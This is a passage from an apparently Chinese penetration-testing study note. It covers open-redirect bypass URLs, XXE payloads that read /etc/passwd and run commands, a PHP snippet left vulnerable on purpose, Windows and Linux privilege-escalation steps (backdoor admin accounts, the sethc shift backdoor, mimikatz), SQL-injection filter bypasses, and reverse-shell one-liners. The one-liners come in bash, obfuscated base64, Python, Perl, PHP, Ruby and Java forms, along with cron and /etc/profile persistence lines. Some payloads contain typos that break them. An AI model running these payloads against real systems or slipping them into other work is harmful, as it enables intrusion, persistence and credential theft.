`url=https://www.baidu.com/linkurl=iMwwNDM6ahaxKkSFuOG`

就可以跳转到自己站点了

另一种类似，但是程序的跳转白名单比较严格，只能是自己域的地址，这时需要有一个目标其它域的任意跳转漏洞，比如`https://auth.landgrey.me/jump.do?url=evil.com`，然后测试时

`https://www.landgrey.me/redirect.php?url=https://auth.landgrey.me/jump.do?url=evil.com`

- 畸形地址绕过

这一部分由于各种语言、框架和代码实现的不同，防护任意跳转代码的多种多样，导致绕过方式乍看起来很诡异，有多诡异

10种bypass方式

- 单斜线"/"绕过

`https://www.landgrey.me/redirect.php?url=/www.evil.com`

- 缺少协议绕过

`https://www.landgrey.me/redirect.php?url=//www.evil.com`

- 多斜线"/"前缀绕过

`https://www.landgrey.me/redirect.php?url=///www.evil.com`

`https://www.landgrey.me/redirect.php?url=www.evil.com`

- 利用"@"符号绕过

`https://www.landgrey.me/redirect.php?url=https://www.landgrey.me@www.evil.com`

- 利用反斜线"\"绕过

`https://www.landgrey.me/redirect.php?url=https://www.evil.com\www.landgrey.me`

- 利用"#"符号绕过

`https://www.landgrey.me/redirect.php?url=https://www.evil.com#www.landgrey.me`

- 利用"?"号绕过

`https://www.landgrey.me/redirect.php?url=https://www.evil.com?www.landgrey.me`

- 利用"\\"绕过

`https://www.landgrey.me/redirect.php?url=https://www.evil.com\\www.landgrey.me`

- 利用"."绕过

`https://www.landgrey.me/redirect.php?url=.evil(可能会跳转到www.landgrey.me.evil域名)`

`https://www.landgrey.me/redirect.php?url=.evil.com(可能会跳转到evil.com域名)`

- 重复特殊字符绕过

`https://www.landgrey.me/redirect.php?url=///www.evil.com//..`

`https://www.landgrey.me/redirect.php?url=www.evil.com//..`

#### <font color="yellow">003 防御方法</font>

- 代码固定跳转地址，不让用户控制变量
- 跳转目标地址采用白名单映射机制，比如1代表auth.landgrey.me，2代表www.landgrey.me，其它不做任何动作
- 合理充分的校验校验跳转的目标地址，非己方地址时告知用户跳转

### <font color="yellow">08 0day漏洞</font>

#### <font color="yellow">001 简介</font>

通常是指还没有补丁的漏洞，也就是说官方还没有发现或者是发现了还没有开发出安全补丁的漏洞，利用0day漏洞进行的攻击，特点是利用简单，危害较大

#### <font color="yellow">002 常见0day——struts2</font>

Struts2框架存在漏洞，平时说的存在struts2漏洞是指的远程命令/代码执行漏洞

Struts2漏洞有很多，比较著名的几个远程命令/代码执行漏洞
- S2-016

	影响范围：Struts 2.0.0 - Struts 2.3.15

- S2-032

	影响范围：Struts 2.3.20 - Struts Struts 2.3.28(except 2.3.20.3 and 2.3.24.3)

- S2-037

	影响范围：Struts 2.3.20 - Struts Struts 2.3.28.1

- S2-045

	影响范围：Struts 2.3.5 - Struts 2.3.31 , Struts 2.5 - Struts 2.5.10

- S2-046

	影响范围：Struts 2.3.5 - Struts 2.3.31 , Struts 2.5 - Struts 2.5.10

- S2-048

	影响范围：Struts 2.3.x with Struts 1 plugin and Struts 1 action

	危害：可获取服务器权限

利用该漏洞可执行任意操作，例如上传shell，添加管理员账号等，下图我们展示的是查询os版本信息，以证明漏洞存在

#### <font color="yellow">003 常见0day——Java反序列化</font>

-  Java序列化：把Java对象转换为字节序列的过程便于保存在内存、文件、数据库中，ObjectOutputStream类的writeObject()方法可以实现序列化
-  Java反序列化：把字节序列恢复为Java对象的过程，ObjectInputStream类的readObject()方法用于反序列化
-  影响范围：WebLogic、WebSphere、JBoss、Jenkins、OpenNMS这些大名鼎鼎的Java应用，都收到影响
-  危害：导致远程代码执行，获取服务器权限

直接部署一个webshell，利用非常简单

#### <font color="yellow">004 常见的0day——bash破壳漏洞</font>

- Bash漏洞：bash漏洞源于在调用Bash Shell之前可以用构造的值创建环境变量，由于没有对输入的环境变量进行检测，攻击者可以在输入变量的时候可以包含恶意代码，在shell被调用后会被立即执行
- 影响范围：影响目前主流的操作系统平台，包括但不限于Redhat、CentOS、Ubuntu、Debian、Fedora、Amazon Linux、OS X 10.10等平台
- 危害：黑客利用该漏洞，可以执行任意代码，甚至可以不需要经过认证，就能远程取得系统的控制权，包括执行恶意程序，或在系统内植入木马，或获取敏感信息

#### <font color="yellow">005 常见的0day——心脏滴血漏洞</font>

- 心脏滴血漏洞(OpenSSL心脏滴血漏洞)：未能正确检测用户输入参数的长度，攻击者可以利用该漏洞，远程读取存在漏洞版本的OpenSSL服务器内存中64K的数据，获取内存中的用户名、密码、个人相关信息以及服务器的证书等私密信息
- 影响范围：该漏洞纰漏时，约有17%(大约五十万)通过认证机构认证的互联网安全网络服务器容易受到攻击
- 危害：通过多个测试实例表明，根据对应OpenSSL服务器承载业务类型，攻击者一般可获得用户X.509证书私钥、实时连接的用户账号密码、会话Cookie等敏感信息，进一步可直接取得相关用户权限，窃取私密数据或执行非授权操作

#### <font color="yellow">006 常见的0day——永恒之蓝</font>
- 永恒之蓝(EternalBlue)：美国国家安全局(NSA)开发的漏洞利用程序，于2017年4月14日被黑客组织影子掮客泄露，Wannacry传播利用的是windows的smb漏洞，漏洞补丁是MS17-010
- 影响范围：大多数Windows系统都受到影响(已有相关补丁)
- 危害：获取服务器权限

#### <font color="yellow">007 常见的0day——samba漏洞</font>

- Linux版永恒之蓝，CVE-2017-7494
- 差异：Windows的SMB服务器默认开启，Samba在大多数的Linux发行版中需要手动开启
- 影响范围：漏洞影响Samba3.5.0及3.5.0和4.6.4之间的任意版本(不包括4.5.10、4.4.14、4.6.4)
- 危害：可直接获取服务器shell

#### <font color="yellow">008 常见的0day——dedecms</font>

- Dedecms，织梦内容管理系统
- recommend.php存在sql注入
- 利用EXP
- 危害：上述exp可获取管理员密码

#### <font color="yellow">009 常见的0day——phpcms</font>

- phpcms,PHPCMS V9内容管理系统
- Authkey泄露、17年最新getshell 0day
- Authkey泄露利用EXP
- 危害：若存在该漏洞，访问上述链接authkey会泄露，可利用authkey进行注入

### <font color="yellow">09 XXE漏洞</font>

XXE漏洞全称(XML External Entity Injection)即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害

XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件

XML(EXtensible Markup Language，可扩展标记语言)用来结构化、存储以及传输信息

XML文档结构包括3部分

- XML声明
- 文档类型定义(可选)
- 文档元素
  
```xml
<!-- XML声明(定义了XML的版本和编码) -->
	<?xml version="1.0" encoding="ISO-8859-1"?>

	<!-- 文档类型定义 -->
	<!DOCTYPE note [
		<!ELEMENT note (to,from,heading,body)>
		<!ELEMENT to      (#PCDATA)>
		<!ELEMENT from    (#PCDATA)>
		<!ELEMENT heading (#PCDATA)>
		<!ELEMENT body    (#PCDATA)>
	]>
	<!-- 文档元素 -->
	<note>
		<to>George</to>
		<from>John</from>
		<heading>Reminder</heading>
		<body>Don't forget the meeting!</body>
	</note>
```

#### <font color="yellow">001 View Code</font>

XML声明

> xml声明以`<?`开头，以`?>`结束
> 
> version属性是必选的，它定义了XML版本
> 
> encoding属性是可选的，它定义了XML进行解码时所用的字符集
> 
> ```xml
> <?xml version="1.0" encoding="ISO-8859-1"?>
> ```

文档类型定义

> 文档类型定义(Document Type Definition，DTD)用来约束一个XML文档的书写规范
> 
> 文档类型定义的基础语法
> 
> `<!ELEMENT 元素名 类型>`
> 
> 内部定义
> 
> 将文档类型定义放在XML文档中，称为内部定义，内部定义的格式如下
> 
> `<!DOCTYPE 根元素 [元素声明]>`
> 
> eg.
> 
> ```xml
> <!DOCTYPE note [
> 	<!-- 定义此文档是note类型 -->
> 	<!ELEMENT note (to,from,heading,body)>
> 	<!-- 定义note有4个元素:to from heading body -->
>  	<!ELEMENT to      (#PCDATA)>
> 	<!-- 定义to元素为#PCDATA类型  -->
>  	<!ELEMENT from    (#PCDATA)>
> 	<!-- 定义from元素为#PCDATA类型 -->
>  	<!ELEMENT heading (#PCDATA)> 
> 	<!-- 定义heading元素为#PCDATA类型 -->
>  	<!ELEMENT body    (#PCDATA)>
> 	<!-- 定义body元素为#PCDATA类型 -->
> ]>
> ```

外部文档引用

> 文档类型定义的内容也可以保存为单独的DTD文档
> 
> DTD文档在本地格式
> 
> ```xml
> <!DOCTYPE 根元素 SYSTEM "文件名">
> <!--eg：<!DOCTYPE note SYSTEM "note.dtd">-->
> ```
> 
> DTD文档外网引用
> 
> ```xml
> <!DOCTYPE 根元素 PUBLIC "DTD名称" "DTD文档的URL">
> <!--eg：<!doctype html public "xxx" "http://www.xx.com/note.dtd">-->
> ```

#### <font color="yellow">002 漏洞代码</font>

`file_get_contents`函数读取了`php://input`传入的数据，但是传入的数据没有经过任何过滤，直接在loadXML函数中进行了调用并通过了echo函数输入`$username`的结果，这样就导致了XXE漏洞的产生

```php
<?php 
libxml_disable_entity_loader(false);
$xmlfile=file_get_contents('php://input');
$dom=new DOMDocument();

$dom->loadXML($xmlfile,LIBXML_NOENT | LIBXML_DTDLOAD);
$creds=simplexml_import_dom($dom);
$username=$creds->username;
$password=$creds->password;
echo 'hello'.$username;
?>
```

#### <font color="yellow">003 文件读取</font>

通过加载外部实体，利用file://、php://等伪协议读取本地文件

payload

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE creds[
<!ELEMENT userename ANY>
<!ELEMENT password ANY>
<!ENTITY xxe SYSTEM="file:///etc/passwd"]>
<creds>
    <username>&xxe</username>
    <password>test</password>
</creds>
```

#### <font color="yellow">004 内网探测</font>

利用xxe漏洞进行内网探测，如果端口开启，请求返回的时间会很快，如果端口关闭请求返回的时间会很慢

探测22号端口是否开启

payload

```xml
<?xml version="1.0"?>
<!DOCTYPE creds[
<!ELEMENT userename ANY>
<!ELEMENT password ANY>
<!ENTITY xxe SYSTEM="http://127.0.0.1.22"]>
<creds>
    <username>&xxe</username>
    <password>test</password>
</creds>
```

#### <font color="yellow">005 内网应用攻击</font>

通过XXE漏洞进行内网应用攻击，例如攻击内网jmx控制台未授权访问的JBpss漏洞进行攻击

#### <font color="yellow">006 命令执行</font>

利用xxe漏洞可以调用except://伪协议调用系统命令

payload

```xml
<?xml version="1.0"?>
<!DOCTYPE creds[
<!ELEMENT userename ANY>
<!ELEMENT password ANY>
<!ENTITY xxe SYSTEM="except://id"]>
<creds>
    <username>&xxe</username>
    <password>test</password>
</creds>
```

#### <font color="yellow">007 漏洞修补</font>

禁用外部实体：在代码中设置`libxml_disable_entity_loader(true)`

过滤用户提交的XML数据：过滤关键词为`<!DOCTYPE`、`<!ENTITY`、`SYSTEM`和`PUBLIC`

#### <font color="yellow">008 简介</font>

XML外部实体注入(XML External Entity)简称XXE漏洞

简介

- XML指可扩展标记语言(EXtensible Markup Language)
- XML是一种很像HTML的标记语言
- XML的设计宗旨是传输数据，而不是显示数据
- XML标签没有被预定义，您需要自行定义标签
- XML被设计为具有自我描述性
- XML是W3C的推荐标准

XML文档结构包括XML声明、DTD文档类型定义(可选)、文档元素，DTD全称为，Document Type Definition，中文翻译为文档类型定义，是一套为了进行程序间的数据交换而建立的关于标记符的语法规则，文档类型定义(DTD)可定义合法的XML文档构建模块，它使用一系列合法的元素来定义文档的结构，DTD可被成行地声明于XML文档中，也可作为一个外部引用

内部的DOCTYPE声明：`<!DOCTYPE root-element [element-declarations]>`

外部文档声明：`<!DOCTYPE root-element SYSTEM "filename">`

在DTD中进行实体声明的时候，将使用ENTITY关键字来声明，实体是用于定义引用普通文本或特殊字符的快捷方式的变量，实体可在内部或外部进行声明

内部实体声明：`<!ENTITY entity-name "entity-value">`

外部实体声明：`<!ENTITY entity-name SYSTEM "URI/URL">`

XXE漏洞代码分析

### <font color="yellow">10 提权</font>

#### <font color="yellow">001 Web服务器提权</font>

- SER-TU提权：通常是利用SERFTP服务器管理工具，首先要在安装目录下找到INI配置文件，必须具备可写入的权限
- RADMIN提权：在扫描4899空口令后，同样需要他来连接
- PCANYWHRER提权：也是远程客户端软件，下载安装目录的CIF文件进行破解
- SAM提权：SAM系统帐户，通常需要下载临时存放的SAM文件，然后进行HASH破解
- NC提权：利用NC命令，反弹一个端口，然后TELNET远程去连接一个端口，虽然权限不够大，但结合巴西烤肉，也是能够成功的
- PR提权：PR提权，这个就不多说了，最好是免杀的PR大杀器，这样更方面我们去操作
- IIS提权：IIS6.0提权，首先需要获取IIS的配置信息，利用工具进行添加后门用户
- 43958提权：如果SER-TU有直接读入和执行的权限，那么我们就可以直接提权
- PERL提权：PERL提权通常是针对PERL文件夹下的提权方式，利用DIR目录%20NET USER这样来建立后门用户
- 内网LCX提权：转发工具LCX，通常需要先本地监听一个端口，然后转发，针对内网，用本地的127连接对方的3389
- 启动提权：如果服务器启动项有能够执行的权限，那么应该说管理员的技术肯定不精湛
- 替换服务提权：替换某个服务EXE，比如SER-TU，可将原有的删除，再传一个同样的SER.EXE上去，等待服务器重启
- FXP提权：FXP这个工具其实本身他是一个传输工具，但我们可以下载他的三个文件，然后，用密码查看器的功能去获得密码
- 输入法提权：目前来说的话，输入法提权的思路基本上不太可行了
- 360提权：360提权，也就是我们常说的SHIFT后门，如果执行了360漏洞利用程序，连接服务器用SHIFT5下，弹出了CMDSHELL即为成功
- VNC提权：VNC，我们通常是扫描5900国外服务器时候用到VNC来连接的，同样，我们如果得到了VNC的密码，通常可以利用他来提权
- 2003ODAY提权：如果服务器是2003的，那么就可以利用2003ODAY利用工具来进行提权了
- ROOT提权：如果你获得了MSSQL的密码，那么就可以导入注册表的方式，利用MSSQL语句执行我们想要的命令了
- SA密码服务器提权：通常去寻找SA，MSSQL的相关密码，比如CONFIG.ASP,CONN.ASP等等
- FTP溢出提权：这个用到LCX工具，本地溢出，转发一个端口，虽然不是内网，利用默认的21进行提升权限

#### <font color="yellow">002 简介</font>

主要针对网站测试过程中，当测试某一网站时，通过各种漏洞提升webshell权限来拿到该服务器的权限

常见脚本所处的权限

- asp/PHP，匿名权限(网络服务权限，权限较小)
- aspx，user权限(普通用户权限)
- jsp，系统权限(通常)

收集信息

- 必要信息
	内/外网
	服务器系统和版本位数
	服务器的补丁情况
	服务器的安装软件情况
	服务器的防护软件情况
	端口情况
	支持脚本的情况
- 常见命令(for windows)
	- ipconfig /all：查看当前ip
	- net user：查看当前服务器账号情况
	- netstat –ano：查看当前服务器端口开放情况
	- ver：查看当前服务器操作糸统
	- systeminfo：查看当前服务器配置信息(补丁情况)
	- tasklist /svc：查看当前服务器进程
	- taskkill –PID ID号：结束某个pid号的进程
	- taskkill lim qq.exe /f：结束qq进程
	- net user abc abc /add：添加一个用户名为abc密码为abc的用户
	- whoami：查看当前操作用户(当前权限)
- 常见命令(for linux)
    - ls –al：查看当前服务器的文件和文件夹
	- pwd：查看当前操作路径
	- uname -a：查看当前服务器的内核信息
- cmd执行命令
	- 防护软件拦截
	- cmd被降权
	- 组件被删除
	
	找到可读写目录上传cmd.exe，将执行的cmd.exe路径替换成上传的路径，再次调用

#### <font color="yellow">003 windows提权</font>

- 第三方软件提权
	- FTP软件
		- server –u、g6ftp、FileZilla
	- 远程管理软件
		- PCanywhere、readmin、vnc
- 溢出提权
	- server-u提权
		- 有修改权限
			- 检查是否有可写权限，修改server-u，默认安装目录下的servUDaemou.ini
			- 增加用户
			- 连接
			- 执行命令
			
			quote site exec bet user abc abc.com /add
			
			quote site exec net localgroup administertors abc /add
		
		- 无修改权限
			- 暴力破解mds
			- 溢出提权
- 启动项提权

	G6ftp提权
	- 下载管理配置文件，将administrator管理密码破解
	- 使用lcx端口转发(默认只允许本机连接)
	- lcx.exe –tran 8027 127.0.0.1 8021
	- 使用客户端管理员用户登录
	- 创建用户并设置权限和执行的批处理文件
	- 上传批处理
	- 已创建的普通用户登录ftp
	- 执行命令quate site x.bat
	- x.bat内容为添加系统用户提权

- 破解hash提权
	- filezilla提权：filezilla是一款开源的ftp服务器和客户端的软件若安装了服务器默认只监听127.0.0.1的14147端口并且默认安装目录下有两个敏感文件
		- filezillaserver.xm(包含了用户信息)
		- filezillaserver interface.xml(包含了管理信息)
		
		提权思路
		
		- 下载这两个文件，拿到管理密码
		- 配置端口转发，登录远程管理ftpserver创建ftp用户
		- 分配权限，设置家目录为c:\
		- 使用cmd.exe改名为sethc.exe替换
		- c:\windows\system32\sethc.exe生成shift后门
		- 连接3389按5次shift调出cmd.exe
		- query user(显示管理员是否在线)
- 数据库提权

#### <font color="yellow">004 服务器系统提权意义</font>

- 修改服务器上某个文件
- 查看服务器上某个文件
- 获取服务器上数据库权限

网站webshell权限解析

<font color="red">一般情况下，webshell权限介于guests-users之间，权限较小</font>

webshell权限影响条件

- 网站脚本类型
- 搭建平台类型
- 当拿到一个网站时，看看它的脚本类型

`ASP PHP(小于users)<ASPX(users) <JSPs`(ystem，如果网站是JSP搭建，权限就是system了，也就是不用提权了)

`phpstudy apmserv lamp 等软件搭建 = administrators`

常规提权的方法

- 数据库提权
- 溢出漏洞提权
- 第三方软件提权

#### <font color="yellow">005 服务器提权系统溢出漏洞</font>

前期的信息收集

- 服务器操作系统的位数
- 网站脚本程序类型
- 服务器补丁情况
- 服务器防护软件
- 其他信息整理

常见的系统命令(for windows)

- ipconfig：查看计算机ip地址(判定网络情况，是否是内网还是外网)
- net user：查看计算机用户
- net start：查看计算机开启服务(可以看一下是否开启防护软件)
- whoami：查看当前用户权限
- tasklist /svc：查看计算机进程(判断第三方软件等)
- systeminfo：查看计算机相关信息(操作系统、位数、补丁情况等)
- netstat -ano：查看计算机端口开放情况

#### <font color="yellow">006 对提权的重新记录</font>

信息收集

- 内网
- 服务器系统和版本位数
- 服务器的补丁情况
- 服务器的安装软件情况
- 服务器的防护软件情况
- 端口情况
- 支持脚本的情况

常见命令(for windows)

- ipconfig /all：查看当前ip
- net user：查看当前服务器账号情况
- netstat –ano：查看当前服务器端口开放情况
- ver：查看当前服务器操作糸统
- systeminfo：查看当前服务器配置信息(补丁情况)
- tasklist /svc：查看当前服务器进程
- taskkill –PID ID号：结束某个pid号的进程
- taskkill lim qq.exe /f：结束qq进程
- net user abc abc /add：添加一个用户名为abc密码为abc的用户
- whoami：查看当前操作用户(当前权限)

常见命令(for linux)

- ls –al：查看当前服务器的文件和文件夹
- pwd：查看当前操作路径
- uname -a：查看当前服务器的内核信息

cmd执行命令

- 防护软件拦截
- cmd被降权
- 组件被删除

找到可读写目录上传cmd.exe，将执行的cmd.exe路径替换成上传的路径，再次调用

#### <font color="yellow">007 提权的条件</font>

如在拿到webshell权限、数据库权限、普通用户权限

Windows基础命令

- query user：查看用户登录情况
- whoami：查看当前用户权限
- systeminfo：查看当前系统版本和补丁信息

添加管理员用户–设置密码为`123456`

`net user 1111 123456 /add`

`net localgroup administrators 1111 /add`

如果远程桌面连接不上，那么就添加远程桌面组

`net localgroup "Remote Desktop Users" 1111 /add`

其他基础命令
- ipconfig：查看本机ip信息，可加/all参数
- netstat-ano：查看端口情况
- dir c:\：查看目录
- type c:\...\...\....txt：查看指定位置文件内容，一般为文本文件
- echo 字符串>....txt：写入文本到文件，特殊字符<>等前面加^
- copy ....txt ....php：复制文件
- renname d:\....txt ....txt：将某个路径下文件重命名
- tasklist：查看所有进程占用的端口
- taskkill /im ....exe /f：强制结束指定进程

linux基础命令：本地溢出提权、数据库提权、三方软件提权、信息泄露

#### <font color="yellow">008 基于密码破解的提权</font>

密码获取的常用手段

- 中间人劫持：网络窃听
- 用户主机窃听：键盘记录
- 简单猜测：常用密码(弱口令)
- 系统漏洞：永恒之蓝
- 用户泄露：git、配置文件等泄露
- 系统后门：shift后门等等

windows的密码原理
	
> windows采用两种方法对用户密码进行哈希处理，分别是LM和NT，而哈希是一种加密函数经过计算后的结果
> 
> windows系统密码hash默认情况下由两部分组成，第一部分是LM-hash，第二部分是NT-hash
> 
> 得到了哈希密码后可以通过在线查询网站来破解

windows密码hash导出(获取)

> 导出导入SAM、system
> 
> gethashs导出
> 
> Pwdump导出
> 
> Wce导出

这四种方法都是用不同的工具去获取，基本差不多的

破解hash密码：导入SAM和system文件(也可以导入 pwdump导出来的文件)进行暴力破解即可

明文密码的获取

> 工具
> 
> Wce明文密码获得
> 
> Mimikatz明文密码获得
> 
> - privllege::debug
> - sekurlsa::logonpasswords
> 
> Getpass明文密码获得

Linux密码获取和破解

- join破解
- 加载字典破解

#### <font color="yellow">009 windows系统的提权基础(pr提权)</font>

windows提权

- 密码收集
	- 注册表
	- 日志
	- .rap文件
	- 内存
	- 配置文件
	- sam文件
- 内核提权
	- ms09-012(pr.exe)
- 数据库提权
	- mysql
	- sql server
- 应用提权
	- ftp

#### <font color="yellow">010 windows提权实践</font>

- WinSysHelper-master(上传bat+txt文件，适用于2003之前的系统)
- powershell

这里首先了解学习一下powersell的知识，在win7虚拟机中开启powshell，并查看其版本(Get-Host或者`$PSVersionTable.PSVERSION`命令来查看)

powershell脚本的文件名后缀是.PS1

这里利用Sherlock来提权(Sherlock是一个在Windows下用于本地提权的PowerShell脚本，可以在GitHub上下载)

#### <font color="yellow">011 Linux提权基础</font>

##### <font color="yellow">0001 基础命令</font>
- 获取系统信息
	- cat /etc/issue：查看发行版
	- cat /etc/*-release：查看发行版
	- cat /proc/version
	- uname -a：查看内核版本
	- rpm -q kernel：红帽系统特有
	- dmesg | grep Linux
	- ls /boot | grep vmlinuz-
	- lsb_release -a
- 检查用户权限
	- sudo -l
	- cat /etc/sudoers
	- whoami
	
	passwd文件中存储了用户，shadow文件中存储的是密码的hash，出于安全的考虑，passwd是全用户可读，root可写，而Shadow是仅root可读写的
	
	passwd由冒号分割，第一列是用户名，第二列是密码，x代表密码hash被放在shadow里面了(这样非root就看不到了)

- 查看环境变量
	
	搜寻有配置错误的环境变量，查看是否优先从不安全的路径执行文件
	
	- cat /etc/profile
	- cat /etc/bashrc
	- cat ~/.bash_profile
	- cat ~/.bashrc
	- cat ~/.bash_logout
	- cat ~/.bash_history
	- env
	- set
- 检查历史文件及命令
	- cat ~/.*_history
- 搜寻可被低权限用户使用的root权限程序
	- crontab -l
	- ls -alh /var/spool/cron
	- ls -al /etc/ | grep cron
	- ls -al /etc/cron*
	- cat /etc/cron*
	- cat /etc/at.allow
	- cat /etc/at.deny
	- cat /etc/cron.allow
	- cat /etc/cron.deny
	- cat /etc/crontab
	- cat /etc/anacrontab
	- cat /var/spool/cron/crontabs/root
- 检查以root权限的进程是否存在漏洞
	- ps aux | grep root
	- ps -ef | grep root
- 搜索纯文本凭据的文件
	- grep -ir user *
	- grep -ir pass *
- 查找可写的配置文件
	- find /etc/ -writable -type f 2>/dev/null
- 查找suid权限的程序
	- find / -user root -perm -4000 -print 2>/dev/null
	- find / type f -perm -u=s 2>/dev/null
- 可利用的脚本
	- LinEnum 
	- linuxprivchecker.py
	- unix-privesc-check 
- 获得交互shell
	- python -c 'import pty;pty.spawn("/bin/bash")' 
	- echo os.system('/bin/bash')
	- /bin/sh -i

##### <font color="yellow">0002 反弹shell实战</font>

Bash反弹shell

> Linux 反弹 shell 使用下面这条命令，该命令弹回来的shell是不可交互的，也就是比如 vim、passwd 命令不能用
>
> ```bash
> bash -i >& /dev/tcp/192.168.10.27/4444 0>&1   #将shell环境转发到192.168.10.32的4444端口上
> 也可以如下：
> {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwLjI3LzQ0NDQgMD4mMSA=}|{base64,-d}|{bash,-i}
> ```
> 
> 然后客户端用netcat进行接收
> 
> ```bash
> nc -lvp  4444  #监听4444端口
> ```
> 
> 只有拥有`/bin/bash`的用户，才能使用该命令，如apache等web用户，无法使用该命令(以下是使用菜刀连接的webshell，获取到的shell是apache 的shell)
> 
> 文件描述符
> 
> - 标准输入(stdin)：代码为0，使用`<`或`<<` 
> - 标准输出(stdout)：代码为1，使用`>`或`>>` 
> - 标准错误输出(stderr)：代码为2，使用`2>`或`2>>`
> - 而通过查阅资料，发现`>&`和`&>`两者一个意思，都是将标准错误输出合并到标准输出中
> 
> 以下这些命令其实都可以用于linux反弹shell
> 
> ```bash
> bash -i >& /dev/tcp/192.168.10.27/4444 0>&1 
> bash -i >& /dev/tcp/192.168.10.27/4444 0<&1 
> bash -i $> /dev/tcp/192.168.10.27/4444 0>$1 
> bash -i $> /dev/tcp/192.168.10.27/4444 0<&1 
> ```
> 
> 但是，很多时候，由于我们获取的shell并不是一个具有完整交互的shell，因此可能会在使用过程中被挂起，甚至还可能会因为我们的操作失误，例如不小心摁下了Ctrl-C，这将直接终止我们的整个shell进程，或者获得的shell类型是sh的，我们使用不习惯
> 
> 如果目标主机有python环境，我们在用netcat获得了反弹的shell后，可以执行下面的命令，才获得一个正常的shell(可以进行交互的shell)，可以执行passwd命令，但是vim命令还是用不了
> 
> ```bash
> python -c 'import pty;pty.spawn("/bin/bash")'
> ```

加密bash反弹shell的流量

> - 在vps上生成SSL证书的公钥/私钥对，执行以下命令，一路回车即可
> ```bash
> openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
> ```
> - 在VPS监听反弹shell
> ```bash
> openssl s_server -quiet -key key.pem -cert cert.pem -port 4444
> ```
> - 在目标上用openssl加密反弹shell的流量
> ```bash
> mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 192.168.10.136:4444 > /tmp/s;rm /tmp/s
> ```

Python反弹shell

> 使用下面这条命令弹回来的shell也是不可交互的shell，即 vim 和 passwd 等命令用不了
> 
> ```bash
> #利用python反弹一个bash类型的shell
> python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.10.25",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
> ```
> 
> 只有拥有 `/bin/bash` 的用户，才能使用该命令，如apache等web用户，无法使用该命令(以下是使用菜刀连接的webshell，获取到的 shell 是 apache 的shell)
	
其他命令反弹shell

> ```
> Perl：
> 	perl -e 'use Socket;$i="192.168.10.13";$p=8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
> PHP：
> 	php -r '$sock=fsockopen("192.168.10.13",8888);exec("/bin/sh -i <&3>&3 2>&3");'
> Ruby：
> 	ruby -rsocket -e'f=TCPSocket.open("192.168.10.13",8888).to_i;exec sprintf("/bin/sh -i <&%d>&%d 2>&%d",f,f,f)'
> Java：
> 	r = Runtime.getRuntime() p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/192.168.10.13/8888;cat <&5 2="" |="" while="" read="" line;="" do="" \$line="">&5 >&5; done"] as String[]) p.waitFor()
> ```

写入命令到定时任务文件

> 我们可以在远程主机的定时任务文件中写入一个反弹shell的脚本，但是前提是我们必须要知道远程主机当前的用户名是哪个，因为我们的反弹shell命令是要写在`/var/spool/cron/`当前用户命令的文件内的，所以必须要知道远程主机当前的用户名，否则就不能生效
> 
> 比如，当前用户名为root，我们就要将下面内容写入到 `/var/spool/cron/root` 中(centos系列主机)
> 
> 比如，当前用户名为root，我们就要将下面内容写入到 `/var/spool/cron/crontabs/root` 中(debian系列主机)
> 
> ```bash
> */1  *  *  *  *   /bin/bash -i>&/dev/tcp/192.168.10.11/4444 0>&1
> #每隔一分钟，向192.168.10.27的4444号端口发送shell
> ```

写入SSH公钥 

> 将公钥信息传送到远程主机的/root/.ssh/目录下，并且重命名为authorized_keys如果是其他用户，比如test，那就是`/test/.ssh/`下

写入/etc/profile文件

> 将以下命令写入`/etc/profile`文件中，`/etc/profile`中的内容会在用户打开bash窗口时执行
> ```bash
> /bin/bash -i>&/dev/tcp/192.168.10.11/4444 0>&1 &
> ```

##### <font color="yellow">脏牛提权</font>
> 
> 脏牛漏洞，又叫Dirty COW，存在Linux内核中已经有长达9年的时间，在2007年发布的Linux内核版本中就已经存在此漏洞，Linux kernel团队在2016年10月18日已经对此进行了修复
> 
> 漏洞范围：Linux内核 >= 2.6.22(2007年发行，到2016年10月18日才修复)
> 
> 简要分析：该漏洞具体为，Linux内核的内存子系统在处理写入复制(copy-on-write，COW)时产生了竞争条件(race conditio)，恶意用户可利用此漏洞，来获取高权限，对只读内存映射进行写访问，竞争条件，指的是任务执行顺序异常，可导致应用崩溃，或令攻击者有机可乘，进一步执行其他代码，利用这一漏洞，攻击者可在其目标系统提升权限，甚至可能获得root权限

## 0x02 服务器端应用安全

### <font color="yellow">01 注入攻击</font>

#### <font color="yellow">001 注释符</font>

- `//`
- `--%20`
- `/**/`
- `#`
- `--+`
- `-- -`
- `%00`
- `;`

#### <font color="yellow">002 大小写绕过</font>

用于屏蔽一些对大小写敏感的黑名单匹配`?id=1 UnIon SeLeCt user()#`

#### <font color="yellow">003 双写绕过</font>

waf将关键字替换为空，没有回归`?id=1 uniunionon seselectlect user()#`

#### <font color="yellow">004 编码绕过</font>

利用urlencode，ascii(char，hex，unicode等编程绕过)

`'` :

```
%u0027 %u02b9 %u02bc 
%u02c8 %u2032 
%uff07 %c0%27 
%c0%a7 %e0%80 %a7empty 
```

`:`:

```
%u0020 %cuff00 
%c0%20 e0%80%a0
```

`(`: 

```
%u0028 %uff08 
%c0%28 %c0%a8 
%e0%80%a8 
```

`)`: 

```
%u0029 %uff09 
%c0%29 %c0%a9 
%e0%80%a9
```

#### <font color="yellow">005 绕过空格</font>

用Tab代替空格`%20 %09 %0a %0b %0c %0d %a0 /**/`

#### <font color="yellow">006 like绕过</font>

`?id=1' or 1 like 1#`，可以绕过对`=`、`>`等过滤

#### <font color="yellow">007 in绕过</font>

`or '1' IN('1234')#`可以替代`=`


#### <font color="yellow">008 等价函数或变量</font>

`hex()`、`bin()` ==> `ascii()`

